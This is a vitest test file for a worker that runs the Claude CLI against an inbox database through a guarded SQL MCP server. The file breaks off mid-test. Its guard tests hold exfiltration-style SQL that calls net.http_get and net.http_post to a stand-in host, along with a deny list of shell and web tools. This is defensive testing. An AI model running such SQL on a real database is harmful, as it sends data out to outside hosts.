// The apply worker's process half on fakes (Phase 23): the database calls, the CLI run, the SQL
// server's protocol, the MCP config, the pass and the worker. No real process, database or network.

import { describe, expect, it, vi } from 'vitest';

import type { CliExit, CliProcess } from '../../workspace/src/providers/claude-cli.js';
import { buildAgents, buildArgs, checkInit, runClaude, type RunDeps } from '../src/claude.js';
import { CONTEXT_AGENT, MAX_RUNS_PER_DAY, PATHS, POLL_INTERVAL_MS, WRITER_AGENT } from '../src/config.js';
import { createRpc, type ApplyRpc } from '../src/db.js';
import { runLoop, runPass, type PassDeps } from '../src/loop.js';
import { HEARTBEAT_MS, startWorker, type WorkerDeps } from '../src/main.js';
import { MCP_CONFIG_MODE, mcpConfigText, writeMcpConfig } from '../src/mcp-config.js';
import { ROWS_MAX, TOOLS, callTool, handle, type ApplyItemInput, type SqlRunner } from '../src/mcp-sql/rpc.js';
import type { ClaudeOutcome, RunFacts } from '../src/report.js';

const AGENTS = buildAgents('context spec', 'writer rules');

describe('the database calls', () => {
  function recorded(answers: Record<string, Record<string, unknown>[]>) {
    const calls: { sql: string; params: readonly unknown[] }[] = [];
    const query = async (sql: string, params: readonly unknown[] = []) => {
      calls.push({ sql, params });
      const fn = /public\.(\w+)\(/.exec(sql)?.[1] ?? 'other';
      return { rows: answers[fn] ?? [] };
    };
    return { rpc: createRpc(query), calls };
  }

  it('claim returns the request, or null when nothing is queued', async () => {
    expect(await recorded({ inbox_apply_claim: [{ id: '1860' }] }).rpc.claim()).toEqual({ id: 1860 });
    expect(await recorded({}).rpc.claim()).toBeNull();
    await expect(recorded({ inbox_apply_claim: [{ id: 'x' }] }).rpc.claim()).rejects.toThrow(/expected a request id/);
  });

  it('prepare, archive, run_facts and close send typed parameters and read typed answers', async () => {
    const { rpc, calls } = recorded({
      inbox_apply_prepare: [{ prepared: { params: { trigger: 'sync' }, runs_today: 1, queue: [{ id: 5, state: 'dismissed' }] } }],
      inbox_apply_archive: [{ ok: true }],
      inbox_apply_run_facts: [{ facts: { archived_ids: [5], changed_ids: [], unarchived_writes: [], flagged: [], left_ids: [] } }],
      inbox_apply_close: [{ follow_up: '1861' }],
    });
    expect((await rpc.prepare(1860)).queue[0]!.id).toBe(5);
    expect(await rpc.archive(1860, 5, { schema: 'inbox-decision/1' })).toBe(true);
    expect((await rpc.runFacts(1860)).archivedIds).toEqual([5]);
    expect(await rpc.close(1860, 'done', { lines: [] })).toBe(1861);
    await rpc.ping();
    expect(calls.map((c) => c.sql)).toEqual([
      'select public.inbox_apply_prepare($1::bigint) as prepared',
      'select public.inbox_apply_archive($1::bigint, $2::bigint, $3::jsonb) as ok',
      'select public.inbox_apply_run_facts($1::bigint) as facts',
      'select public.inbox_apply_close($1::bigint, $2, $3::jsonb)::text as follow_up',
      'select 1',
    ]);
    expect(calls[1]!.params).toEqual([1860, 5, '{"schema":"inbox-decision/1"}']);
    expect(calls[3]!.params).toEqual([1860, 'done', '{"lines":[]}']);
  });

  it('archive false and a close with no follow-up read as such', async () => {
    const { rpc } = recorded({ inbox_apply_archive: [{ ok: false }], inbox_apply_close: [{ follow_up: null }] });
    expect(await rpc.archive(1, 2, {})).toBe(false);
    expect(await rpc.close(1, 'failed', { lines: [] })).toBeNull();
  });
});

/** An init line as the pinned CLI printed it in this phase's spike, reduced to what is read. */
function initLine(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    type: 'system', subtype: 'init', claude_code_version: '2.1.289', apiKeySource: 'none', permissionMode: 'dontAsk',
    model: 'claude-sonnet-5-5', session_id: '00000000-0000-4000-8000-000000000001',
    mcp_servers: [{ name: 'db', status: 'connected' }, { name: 'bb2dash', status: 'connected' }],
    tools: ['Task', 'mcp__db__query', 'mcp__db__apply_item', 'mcp__bb2dash__search_materials', 'mcp__bb2dash__get_material_text', 'mcp__bb2dash__list_courses'],
    agents: ['general-purpose', CONTEXT_AGENT, WRITER_AGENT],
    skills: ['inbox-apply', 'loop'],
    ...over,
  };
}
const resultLine = (over: Record<string, unknown> = {}) => ({ type: 'result', subtype: 'success', is_error: false, total_cost_usd: 0.42, num_turns: 3, ...over });

describe('the CLI arguments', () => {
  it('are the recorded set, with the prompt last after -- and built from numbers', () => {
    const args = buildArgs({ requestId: 1860, itemIds: [3101, 3104], agents: AGENTS, budgetUsd: 3 });
    expect(args.slice(0, 5)).toEqual(['-p', '--model', 'sonnet', '--tools', 'Agent']);
    expect(JSON.parse(args[args.indexOf('--agents') + 1]!)).toEqual(AGENTS);
    expect(args.slice(args.indexOf('--allowedTools') + 1, args.indexOf('--disallowedTools'))).toEqual([
      'Agent', 'Task', 'mcp__db__query', 'mcp__db__apply_item',
      'mcp__bb2dash__search_materials', 'mcp__bb2dash__get_material_text', 'mcp__bb2dash__list_courses',
    ]);
    expect(args.slice(args.indexOf('--disallowedTools') + 1, args.indexOf('--permission-mode'))).toEqual([
      'Bash', 'Read', 'Write', 'Edit', 'WebFetch', 'WebSearch', 'Glob', 'Grep', 'NotebookEdit',
    ]);
    expect(args).toContain('--strict-mcp-config');
    expect(args[args.indexOf('--mcp-config') + 1]).toBe(PATHS.mcpConfig);
    expect(args[args.indexOf('--setting-sources') + 1]).toBe('project');
    expect(args[args.indexOf('--settings') + 1]).toBe(PATHS.settings);
    expect(args[args.indexOf('--max-budget-usd') + 1]).toBe('3.00');
    expect(args.slice(-2)).toEqual(['--', '/inbox-apply 1860 --unattended --items 3101,3104']);
    expect(args).not.toContain('--bare');
  });

  it('refuses an empty batch, a bad id and a bad budget', () => {
    expect(() => buildArgs({ requestId: 1, itemIds: [], agents: AGENTS, budgetUsd: 3 })).toThrow(/at least one item/);
    expect(() => buildArgs({ requestId: 1, itemIds: [1.5], agents: AGENTS, budgetUsd: 3 })).toThrow(/item id/);
    expect(() => buildArgs({ requestId: 0, itemIds: [1], agents: AGENTS, budgetUsd: 3 })).toThrow(/request id/);
    expect(() => buildArgs({ requestId: 1, itemIds: [1], agents: AGENTS, budgetUsd: 0 })).toThrow(/budget/);
  });

  it('the two agents carry the skill files, their own tools and their own models', () => {
    expect(AGENTS[CONTEXT_AGENT]).toMatchObject({ prompt: 'context spec', model: 'sonnet', tools: expect.not.arrayContaining(['mcp__db__apply_item']) });
    expect(AGENTS[WRITER_AGENT]).toMatchObject({ prompt: 'writer rules', model: 'opus', tools: ['mcp__db__query', 'mcp__db__apply_item'] });
    expect(() => buildAgents('', 'x')).toThrow(/empty/);
  });
});

describe('the init line', () => {
  it('passes as recorded', () => {
    expect(checkInit(initLine())).toEqual([]);
  });

  it.each([
    ['another version', { claude_code_version: '2.1.300' }, /not the pinned 2\.1\.289/],
    ['an API key credential', { apiKeySource: 'ANTHROPIC_API_KEY' }, /not the OAuth token/],
    ['another permission mode', { permissionMode: 'default' }, /permissionMode is default/],
    ['a missing server', { mcp_servers: [{ name: 'db', status: 'connected' }] }, /not exactly bb2dash and db/],
    ['a server that failed', { mcp_servers: [{ name: 'db', status: 'failed' }, { name: 'bb2dash', status: 'connected' }] }, /db is failed/],
    ['a missing SQL tool', { tools: ['Task', 'mcp__db__query'] }, /does not hold mcp__db__apply_item/],
    ['a shell tool', { tools: [...(initLine().tools as string[]), 'Bash'] }, /tools holds Bash/],
    ['no skill', { skills: ['loop'] }, /skills does not hold inbox-apply/],
    ['no writer agent', { agents: [CONTEXT_AGENT] }, /agents does not hold inbox-writer/],
  ])('refuses %s', (_label, over, reason) => {
    expect(checkInit(initLine(over)).join('; ')).toMatch(reason);
  });

  it('refuses a line that is not an init line', () => {
    expect(checkInit({ type: 'assistant' })).toEqual(['the first line is not an init line']);
    expect(checkInit(null)).toEqual(['the first line is not an init line']);
  });
});

/** A stand-in CLI: it prints the lines, then exits with `exit` unless it is killed first. */
function fakeProcess(lines: readonly unknown[], exit: CliExit = { code: 0, signal: null }, opts: { hang?: boolean } = {}) {
  const kills: string[] = [];
  let release: (value: CliExit) => void = () => {};
  const exited = new Promise<CliExit>((resolve) => {
    release = resolve;
  });
  let closed = false;
  async function* stdout(): AsyncGenerator<string> {
    for (const line of lines) yield `${typeof line === 'string' ? line : JSON.stringify(line)}\n`;
    if (opts.hang) {
      while (!closed) await new Promise((r) => setTimeout(r, 1));
      return;
    }
    release(exit);
  }
  const child: CliProcess = {
    stdout: stdout(),
    exited,
    kill: (signal) => {
      kills.push(signal);
      closed = true;
      release({ code: null, signal });
    },
    closeOutput: () => {
      closed = true;
    },
    stderrText: () => '',
  };
  return { child, kills };
}

function runDeps(child: CliProcess, over: Partial<RunDeps> = {}) {
  const lines: string[] = [];
  const spawned: { argv: readonly string[]; cwd: string; env: Record<string, string> }[] = [];
  const deps: RunDeps = {
    spawn: (argv, options) => {
      spawned.push({ argv, cwd: options.cwd, env: options.env });
      return child;
    },
    readOauthToken: () => 'token-value',
    childEnv: (token) => ({ CLAUDE_CODE_OAUTH_TOKEN: token }),
    log: (line) => lines.push(line),
    timeoutMs: 5_000,
    killGraceMs: 5,
    ...over,
  };
  return { deps, lines, spawned };
}

const INPUT = { requestId: 1860, itemIds: [3101], agents: AGENTS, budgetUsd: 3 };
const idle = new AbortController().signal;

describe('one run of the CLI', () => {
  it('a finished run: spawned in the skill folder on the token, cost read from the result line', async () => {
    const { child } = fakeProcess([initLine(), 'noise', { type: 'assistant', message: {} }, resultLine()]);
    const { deps, spawned } = runDeps(child);
    expect(await runClaude(INPUT, deps, idle)).toEqual({ exitCode: 0, timedOut: false, costUsd: 0.42, error: null, detail: null });
    expect(spawned[0]!.argv[0]).toBe('claude');
    expect(spawned[0]!.cwd).toBe(PATHS.runCwd);
    expect(spawned[0]!.env).toEqual({ CLAUDE_CODE_OAUTH_TOKEN: 'token-value' });
  });

  it('an init line that does not pass is killed before it does anything', async () => {
    const { child, kills } = fakeProcess([initLine({ apiKeySource: 'ANTHROPIC_API_KEY' })], { code: 0, signal: null }, { hang: true });
    const { deps, lines } = runDeps(child);
    const outcome = await runClaude(INPUT, deps, idle);
    expect(outcome).toMatchObject({ error: 'cli_error', detail: 'The Claude CLI did not start in the expected configuration.' });
    expect(kills[0]).toBe('SIGTERM');
    expect(lines.join('\n')).toMatch(/init line was refused: the credential source is ANTHROPIC_API_KEY/);
  });

  it('no init line at all is an error, and so is a clean result with a non-zero exit', async () => {
    expect((await runClaude(INPUT, runDeps(fakeProcess([resultLine()]).child).deps, idle)).error).toBe('cli_error');
    const odd = fakeProcess([initLine(), resultLine()], { code: 3, signal: null });
    expect(await runClaude(INPUT, runDeps(odd.child).deps, idle)).toMatchObject({ exitCode: 3, error: 'cli_error' });
  });

  it('the time limit kills the run and it reads as timed out', async () => {
    const { child, kills } = fakeProcess([initLine()], { code: 0, signal: null }, { hang: true });
    const { deps } = runDeps(child, { timeoutMs: 20 });
    const outcome = await runClaude(INPUT, deps, idle);
    expect(outcome).toMatchObject({ timedOut: true, error: 'timed_out', exitCode: null });
    expect(kills).toContain('SIGTERM');
  });

  it("the worker's stop kills the run and it reads as interrupted", async () => {
    const { child, kills } = fakeProcess([initLine()], { code: 0, signal: null }, { hang: true });
    const stop = new AbortController();
    const { deps } = runDeps(child);
    const running = runClaude(INPUT, deps, stop.signal);
    setTimeout(() => stop.abort(), 10);
    expect(await running).toMatchObject({ error: 'interrupted', timedOut: false });
    expect(kills[0]).toBe('SIGTERM');

    const already = new AbortController();
    already.abort();
    const never = runDeps(fakeProcess([]).child);
    expect((await runClaude(INPUT, never.deps, already.signal)).error).toBe('interrupted');
    expect(never.spawned).toHaveLength(0);
  });

  it.each([
    ['an expired sign-in', [{ type: 'assistant', error: 'authentication_failed' }, resultLine({ subtype: 'error_during_execution', is_error: true, api_error_status: 401 })], 'sign_in_expired'],
    ['the cost limit', [resultLine({ subtype: 'error_max_budget_usd', is_error: true })], 'budget_exceeded'],
    ['a plan limit', [{ type: 'rate_limit_event', rate_limit_info: { status: 'rejected' } }, resultLine({ subtype: 'error_during_execution', is_error: true })], 'usage_limit'],
    ['an unknown error end', [resultLine({ subtype: 'error_during_execution', is_error: true })], 'cli_error'],
  ])('%s is named', async (_label, lines, error) => {
    const { child } = fakeProcess([initLine(), ...lines], { code: 1, signal: null });
    expect((await runClaude(INPUT, runDeps(child).deps, idle)).error).toBe(error);
  });

  it('a run reported as paid from usage credits is stopped', async () => {
    const { child, kills } = fakeProcess([initLine(), { type: 'rate_limit_event', rate_limit_info: { status: 'allowed', isUsingOverage: true } }], { code: 0, signal: null }, { hang: true });
    const { deps, lines } = runDeps(child);
    expect((await runClaude(INPUT, deps, idle)).error).toBe('usage_limit');
    expect(kills[0]).toBe('SIGTERM');
    expect(lines.join('\n')).toMatch(/paid from usage credits/);
  });

  it('a missing token never starts the CLI, and a spawn that throws is an error', async () => {
    const noToken = runDeps(fakeProcess([]).child, { readOauthToken: () => { throw new Error('the secret claude_oauth_token is missing'); } });
    expect(await runClaude(INPUT, noToken.deps, idle)).toMatchObject({ error: 'sign_in_expired' });
    expect(noToken.spawned).toHaveLength(0);

    const broken = runDeps(fakeProcess([]).child, { spawn: () => { throw new Error('ENOENT'); } });
    expect(await runClaude(INPUT, broken.deps, idle)).toMatchObject({ error: 'cli_error', detail: 'The Claude CLI could not be started.' });

    const neverStarted = fakeProcess([], { code: null, signal: null, error: 'spawn claude ENOENT' });
    expect(await runClaude(INPUT, runDeps(neverStarted.child).deps, idle)).toMatchObject({ error: 'cli_error' });
  });
});

describe('the MCP config', () => {
  it('names exactly the two servers by path, and no key, token or DSN', () => {
    const config = JSON.parse(mcpConfigText());
    expect(Object.keys(config.mcpServers).sort()).toEqual(['bb2dash', 'db']);
    expect(config.mcpServers.db).toEqual({ command: 'node', args: [PATHS.sqlServer] });
    expect(config.mcpServers.bb2dash.env).toEqual({
      SUPABASE_URL: 'https://goultdzqcavefcgnifdy.supabase.co',
      SUPABASE_SERVICE_ROLE_FILE: PATHS.serviceKeySecret,
    });
    expect(mcpConfigText()).not.toMatch(/postgres|sb_secret|eyJ|password/i);
  });

  it('is written readable by the worker alone', () => {
    const calls: unknown[][] = [];
    writeMcpConfig('/run/apply/mcp.json', {
      writeFileSync: (...args) => calls.push(['write', ...args]),
      chmodSync: (...args) => calls.push(['chmod', ...args]),
    });
    expect(calls).toEqual([
      ['write', '/run/apply/mcp.json', mcpConfigText(), { mode: MCP_CONFIG_MODE }],
      ['chmod', '/run/apply/mcp.json', MCP_CONFIG_MODE],
    ]);
  });
});

describe('the SQL server', () => {
  function runner(over: Partial<SqlRunner> = {}) {
    const queries: { sql: string; limit: number }[] = [];
    const items: ApplyItemInput[] = [];
    const r: SqlRunner = {
      query: async (sql, limit) => {
        queries.push({ sql, limit });
        return { command: 'SELECT', rowCount: 1, rows: [{ n: 1 }] };
      },
      applyItem: async (input) => {
        items.push(input);
        return { outcome: 'archived', statements: [{ command: 'UPDATE', rowCount: 1, rows: [{ id: 'IST.352/x', component_id: 12 }] }] };
      },
      ...over,
    };
    return { r, queries, items };
  }
  const text = (result: Record<string, unknown> | null) => (result?.content as { text: string }[])[0]!.text;
  const item = { request: 1860, item: 3101, statements: ["update assignments set component_id = 12 where id = 'IST.352/x' returning *"], record: { bucket: 'needs_change', change: 'confirmed', rule: '' } };

  it('answers initialize, ping and tools/list, and ignores notifications', async () => {
    const { r } = runner();
    expect(await handle({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26' } }, r)).toMatchObject({
      id: 1, result: { protocolVersion: '2025-03-26', capabilities: { tools: {} }, serverInfo: { name: 'bb2dash-apply-sql' } },
    });
    expect(await handle({ jsonrpc: '2.0', id: 2, method: 'ping' }, r)).toEqual({ jsonrpc: '2.0', id: 2, result: {} });
    expect(await handle({ jsonrpc: '2.0', id: 3, method: 'tools/list' }, r)).toEqual({ jsonrpc: '2.0', id: 3, result: { tools: TOOLS } });
    expect(TOOLS.map((t) => t.name)).toEqual(['query', 'apply_item']);
    expect(await handle({ jsonrpc: '2.0', method: 'notifications/initialized' }, r)).toBeNull();
    expect(await handle('not a message', r)).toBeNull();
    expect(await handle({ jsonrpc: '2.0', id: 4, method: 'resources/list' }, r)).toMatchObject({ error: { code: -32601 } });
    expect(await handle({ jsonrpc: '2.0', id: 5, method: 'tools/call', params: { name: 'execute_sql', arguments: {} } }, r)).toMatchObject({ error: { code: -32602 } });
  });

  it('query runs one read and asks the database for one row more than it shows', async () => {
    const { r, queries } = runner();
    const read = await handle({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'query', arguments: { sql: 'select 1 as n' } } }, r);
    expect(JSON.parse(text(read!.result as Record<string, unknown>))).toEqual({ command: 'SELECT', row_count: 1, rows: [{ n: 1 }] });
    expect(queries).toEqual([{ sql: 'select 1 as n', limit: ROWS_MAX + 1 }]);
  });

  it('apply_item hands the item to the runner whole, and says what was written', async () => {
    const { r, items } = runner();
    const wrote = await callTool('apply_item', item, r);
    expect(wrote!.isError).toBe(false);
    expect(JSON.parse(text(wrote))).toEqual({
      item: 3101, outcome: 'archived',
      statements: [{ command: 'UPDATE', row_count: 1, rows: [{ id: 'IST.352/x', component_id: 12 }] }],
    });
    expect(items).toEqual([item]);
  });

  it('an item taken back is skipped, not an error; a record-only item has no statements', async () => {
    const skipping = runner({ applyItem: async () => ({ outcome: 'skipped' }) });
    const skipped = await callTool('apply_item', item, skipping.r);
    expect(skipped!.isError).toBe(false);
    expect(JSON.parse(text(skipped))).toMatchObject({ item: 3101, outcome: 'skipped' });

    const { r, items } = runner({ applyItem: async () => ({ outcome: 'archived', statements: [] }) });
    const recordOnly = { ...item, statements: [], record: { bucket: 'dismissed', change: 'recorded only', rule: 'not a real gap' } };
    expect(JSON.parse(text(await callTool('apply_item', recordOnly, r)))).toEqual({ item: 3101, outcome: 'archived', statements: [] });
    expect(items).toEqual([]);
  });

  it('a text the guard refuses never reaches the database', async () => {
    const { r, queries, items } = runner();
    const refused = await callTool('query', { sql: "select net.http_get('https://x.example')" }, r);
    expect(refused).toMatchObject({ isError: true });
    expect(text(refused)).toMatch(/^refused: sql names the schema net/);
    expect((await callTool('query', {}, r))!.isError).toBe(true);
    const exfil = await callTool('apply_item', { ...item, statements: ["update assignments set title = title where net.http_post('https://x.example') > 0"] }, r);
    expect(text(exfil)).toMatch(/^refused: statement 1: sql names the schema net/);
    expect(text(await callTool('apply_item', { ...item, statements: ['commit'] }, r))).toMatch(/^refused: statement 1: a write statement is an insert/);
    expect(text(await callTool('apply_item', { ...item, request: 0 }, r))).toMatch(/^refused: request must be/);
    expect(queries).toEqual([]);
    expect(items).toEqual([]);
  });

  it('a database error is a tool result with its SQLSTATE, and says nothing was written', async () => {
    const failing = runner({ applyItem: async () => { throw Object.assign(new Error('permission denied for table attention_items\nCONTEXT: ...'), { code: '42501' }); } });
    const result = await callTool('apply_item', item, failing.r);
    expect(result!.isError).toBe(true);
    expect(text(result)).toBe('error: permission denied for table attention_items (SQLSTATE 42501); nothing was written for this item');

    const badQuery = runner({ query: async () => { throw Object.assign(new Error('cannot execute UPDATE in a read-only transaction'), { code: '25006' }); } });
    expect(text(await callTool('query', { sql: 'select inbox_apply_run_facts(1)' }, badQuery.r))).toBe('error: cannot execute UPDATE in a read-only transaction (SQLSTATE 25006)');
  });

  it('long output is cut', async () => {
    const many = runner({ query: async () => ({ command: 'SELECT', rowCount: 201, rows: Array.from({ length: 201 }, (_v, n) => ({ n })) }) });
    const parsed = JSON.parse(text(await callTool('query', { sql: 'select 1' }, many.r)));
    expect(parsed.rows).toHaveLength(ROWS_MAX);
    expect(parsed.rows_cut_at).toBe(ROWS_MAX);

    const wide = runner({ query: async () => ({ command: 'SELECT', rowCount: 1, rows: [{ t: 'x'.repeat(70_000) }] }) });
    expect(text(await callTool('query', { sql: 'select 1' }, wide.r))).toMatch(/… cut at 60000 characters$/);
  });
});

const NO_FACTS: RunFacts = { archivedIds: [], changedIds: [], unarchivedWrites: [], flagged: [], leftIds: [] };
const FINISHED: ClaudeOutcome = { exitCode: 0, timedOut: false, costUsd: 0.5, error: null, detail: null };

function queueRow(id: number, over: Record<string, unknown> = {}) {
  return { id, kind: 'stack_must_confirm', courseId: 'IST.352', entity: 'assignment', ref: `r${id}`, question: `q${id}`, state: 'resolved', accept: null, hasNote: false, wasApplied: false, appliedAt: null, ...over };
}

function passDeps(over: { rpc?: Partial<ApplyRpc>; claude?: ClaudeOutcome | (() => Promise<ClaudeOutcome>); maxRunsPerDay?: number } = {}) {
  const calls: string[] = [];
  const closes: { id: number; state: string; result: Record<string, unknown> }[] = [];
  const archives: { item: number; decision: Record<string, unknown> }[] = [];
  const runs: { requestId: number; itemIds: readonly number[] }[] = [];
  const lines: string[] = [];
  const rpc: ApplyRpc = {
    claim: async () => { calls.push('claim'); return { id: 1860 }; },
    prepare: async () => { calls.push('prepare'); return { queue: [], runsToday: 0, skip: [], trigger: 'sync' }; },
    archive: async (_request, item, decision) => { calls.push(`archive ${item}`); archives.push({ item, decision }); return true; },
    runFacts: async () => { calls.push('facts'); return NO_FACTS; },
    close: async (id, state, result) => { calls.push(`close ${state}`); closes.push({ id, state, result }); return null; },
    ping: async () => {},
    ...over.rpc,
  };
  const deps: PassDeps = {
    rpc,
    runClaude: async (input) => {
      calls.push('claude');
      runs.push(input);
      return typeof over.claude === 'function' ? over.claude() : (over.claude ?? FINISHED);
    },
    log: (line) => lines.push(line),
    maxRunsPerDay: over.maxRunsPerDay,
  };
  return { deps, calls, closes, archives, runs, lines };
}

describe('one pass', () => {
  it('nothing queued: one call, idle', async () => {
    const p = passDeps({ rpc: { claim: async () => null } });
    expect(await runPass(p.deps)).toBe('idle');
    expect(p.calls).toEqual([]);
  });

  it('an empty queue closes done without starting Claude', async () => {
    const p = passDeps();
    expect(await runPass(p.deps)).toBe('done');
    expect(p.calls).toEqual(['claim', 'prepare', 'facts', 'close done']);
    expect(p.closes[0]!.result).toMatchObject({ lines: ['Nothing to apply'], archived: 0, claude: { started: false } });
  });

  it('records the rows that need no reading itself, then hands the rest to one run, in order', async () => {
    const queue = [queueRow(1, { wasApplied: true, appliedAt: '2026-10-07T18:00:00Z' }), queueRow(2), queueRow(3, { state: 'dismissed' }), queueRow(4, { hasNote: true })];
    const p = passDeps({
      rpc: {
        prepare: async () => ({ queue, runsToday: 0, skip: [], trigger: 'sync' }),
        runFacts: async () => ({ ...NO_FACTS, archivedIds: [1, 2, 3, 4], changedIds: [2, 4] }),
      },
    });
    expect(await runPass(p.deps)).toBe('done');
    expect(p.calls).toEqual(['claim', 'archive 1', 'archive 3', 'claude', 'close done']);
    expect(p.archives.map((a) => [a.item, a.decision.bucket, a.decision.request])).toEqual([[1, 'applied_by_transform', 1860], [3, 'dismissed', 1860]]);
    expect(p.runs).toEqual([{ requestId: 1860, itemIds: [2, 4] }]);
    expect(p.closes[0]!.result).toMatchObject({ lines: ['2 answers applied, 2 recorded only'], archived: 4, changed: 2, trigger: 'sync', claude: { started: true, cost_usd: 0.5 } });
  });

  it("the day's cap stops Claude from starting; the templated rows are still recorded", async () => {
    const p = passDeps({
      rpc: {
        prepare: async () => ({ queue: [queueRow(1, { state: 'dismissed' }), queueRow(2)], runsToday: MAX_RUNS_PER_DAY, skip: [], trigger: 'sync' }),
        runFacts: async () => ({ ...NO_FACTS, archivedIds: [1], leftIds: [2] }),
      },
    });
    expect(await runPass(p.deps)).toBe('failed');
    expect(p.calls).toEqual(['claim', 'archive 1', 'close failed']);
    expect(p.closes[0]!.result).toMatchObject({ error: 'daily_cap', archived: 1, claude: { started: false } });
  });

  it('a run that ends badly closes failed with what was archived before it and what to skip', async () => {
    const p = passDeps({
      claude: { exitCode: null, timedOut: true, costUsd: null, error: 'timed_out', detail: 'The run was stopped at 14 minutes.' },
      rpc: {
        prepare: async () => ({ queue: [queueRow(2), queueRow(3)], runsToday: 0, skip: [9], trigger: 'followup' }),
        runFacts: async () => ({ ...NO_FACTS, archivedIds: [2], changedIds: [2], leftIds: [3, 9] }),
      },
    });
    expect(await runPass(p.deps)).toBe('failed');
    // Item 3 was never reached, so only the earlier failure (9) stays in skip.
    expect(p.closes[0]).toMatchObject({ state: 'failed', result: { error: 'timed_out', archived: 1, skip: [9], trigger: 'followup' } });
  });

  it("one templated row's refusal does not stop the request, and a row taken back is only noted", async () => {
    const p = passDeps({
      rpc: {
        prepare: async () => ({ queue: [queueRow(1, { state: 'dismissed' }), queueRow(2, { state: 'dismissed' }), queueRow(3, { state: 'dismissed' })], runsToday: 0, skip: [], trigger: null }),
        archive: async (_request, item) => {
          if (item === 1) throw new Error('inbox_apply_archive: the decision for item 1 is not an inbox-decision/1 record');
          return item !== 2;
        },
        runFacts: async () => ({ ...NO_FACTS, archivedIds: [3], leftIds: [1] }),
      },
    });
    expect(await runPass(p.deps)).toBe('done');
    expect(p.lines.some((l) => l.includes('item 1 could not be recorded'))).toBe(true);
    expect(p.lines.some((l) => l.includes('item 2 was taken back'))).toBe(true);
    expect(p.closes[0]!.result).toMatchObject({ lines: ['1 recorded only', '1 answer still waiting.'] });
  });

  it('a throw after the claim still closes the request, failed', async () => {
    const p = passDeps({ rpc: { prepare: async () => { throw new Error('connection terminated'); } } });
    expect(await runPass(p.deps)).toBe('failed');
    expect(p.closes[0]).toMatchObject({ id: 1860, state: 'failed', result: { error: 'cli_error', archived: 0, claude: { started: false } } });
    expect(p.lines.some((l) => l.includes('request 1860 failed: connection terminated'))).toBe(true);
  });

  it('a throw after Claude ran still counts the run and what it archived, so the rest is followed up', async () => {
    let factsCalls = 0;
    const p = passDeps({
      rpc: {
        prepare: async () => ({ queue: [queueRow(2), queueRow(3)], runsToday: 0, skip: [], trigger: 'sync' }),
        runFacts: async () => {
          factsCalls += 1;
          if (factsCalls === 1) throw new Error('connection terminated');
          return { ...NO_FACTS, archivedIds: [2], changedIds: [2], leftIds: [3] };
        },
      },
    });
    expect(await runPass(p.deps)).toBe('failed');
    expect(p.closes[0]).toMatchObject({ state: 'failed', result: { error: 'cli_error', archived: 1, claude: { started: true } } });
  });

  it('when even the close cannot be made, the pass says the next claim releases it', async () => {
    const p = passDeps({ rpc: { prepare: async () => { throw new Error('boom'); }, close: async () => { throw new Error('database is gone'); } } });
    expect(await runPass(p.deps)).toBe('failed');
    expect(p.lines.some((l) => l.includes('could not be closed (database is gone); the next claim releases it'))).toBe(true);
  });

  it('logs the follow-up the close filed', async () => {
    const p = passDeps({ rpc: { close: async () => 1861 } });
    await runPass(p.deps);
    expect(p.lines).toContain('pass: request 1860 closed done; follow-up 1861 queued');
  });
});

describe('the loop', () => {
  it('runs passes until told to stop, sleeping between them, and survives a pass that throws', async () => {
    let n = 0;
    const sleeps: number[] = [];
    const p = passDeps({
      rpc: {
        claim: async () => {
          n += 1;
          if (n === 2) throw new Error('db down');
          return null;
        },
      },
    });
    await runLoop({ ...p.deps, sleep: async (ms) => { sleeps.push(ms); }, shouldStop: () => n >= 3 });
    expect(n).toBe(3);
    expect(sleeps).toEqual([POLL_INTERVAL_MS, POLL_INTERVAL_MS]);
    expect(p.lines.some((l) => l.includes('pass: failed: db down'))).toBe(true);
  });
});

describe('the worker', () => {
  function workerDeps(over: Partial<WorkerDeps> = {}) {
    const events: string[] = [];
    const lines: string[] = [];
    let ticks: (() => void) | null = null;
    const query = Object.assign(
      async (sql: string) => {
        events.push(sql.startsWith('select 1') ? 'ping' : (/public\.(\w+)\(/.exec(sql)?.[1] ?? sql));
        return { rows: [] };
      },
      { end: async () => { events.push('end'); } },
    );
    const deps: WorkerDeps = {
      env: { PATH: '/usr/bin' },
      config: { dbUrl: 'postgresql://inbox_apply_runner.x:pw@h:5432/postgres?sslmode=verify-full', dbCa: 'ca', budgetUsd: 3 },
      query,
      readSkillFile: (name) => `text of ${name}`,
      writeMcpConfig: () => events.push('mcp-config'),
      touchAlive: () => events.push('alive'),
      run: { spawn: () => { throw new Error('not used'); }, readOauthToken: () => 'token' },
      log: (line) => lines.push(line),
      sleep: (_ms, signal) => new Promise((resolve) => signal.addEventListener('abort', () => resolve(), { once: true })),
      setInterval: (fn, ms) => {
        events.push(`interval ${ms}`);
        ticks = fn;
        return { stop: () => events.push('interval stopped') };
      },
      ...over,
    };
    return { deps, events, lines, tick: () => ticks?.() };
  }

  it('writes the MCP config, beats, loops, and on stop ends the loop and closes the connection', async () => {
    const w = workerDeps();
    const worker = startWorker(w.deps);
    await vi.waitFor(() => expect(w.events).toContain('inbox_apply_claim'));
    expect(w.events.slice(0, 2)).toEqual(['mcp-config', 'ping']);
    expect(w.events).toContain(`interval ${HEARTBEAT_MS}`);
    await vi.waitFor(() => expect(w.events).toContain('alive'));
    w.tick();
    await vi.waitFor(() => expect(w.events.filter((e) => e === 'alive')).toHaveLength(2));

    worker.stop();
    await worker.done;
    expect(w.events.slice(-2)).toEqual(['interval stopped', 'end']);
  });

  it('a heartbeat the database does not answer is logged without the DSN, and the alive file is not touched', async () => {
    const w = workerDeps();
    const failing = Object.assign(
      async (sql: string) => {
        if (sql === 'select 1') throw new Error(`connect ECONNREFUSED ${w.deps.config.dbUrl}`);
        return { rows: [] };
      },
      { end: async () => {} },
    );
    const worker = startWorker({ ...w.deps, query: failing });
    await vi.waitFor(() => expect(w.lines.some((l) => l.startsWith('heartbeat: the database did not answer'))).toBe(true));
    expect(w.lines.join('\n')).not.toContain('pw@');
    expect(w.events).not.toContain('alive');
    worker.stop();
    await worker.done;
  });

  it('--once runs exactly one pass and stops by itself', async () => {
    const w = workerDeps({ once: true });
    const worker = startWorker(w.deps);
    await worker.done;
    expect(w.events.filter((e) => e === 'inbox_apply_claim')).toHaveLength(1);
    expect(w.events.slice(-2)).toEqual(['interval stopped', 'end']);
  });

  it('refuses to start when a skill file is empty', () => {
    const w = workerDeps({ readSkillFile: () => '' });
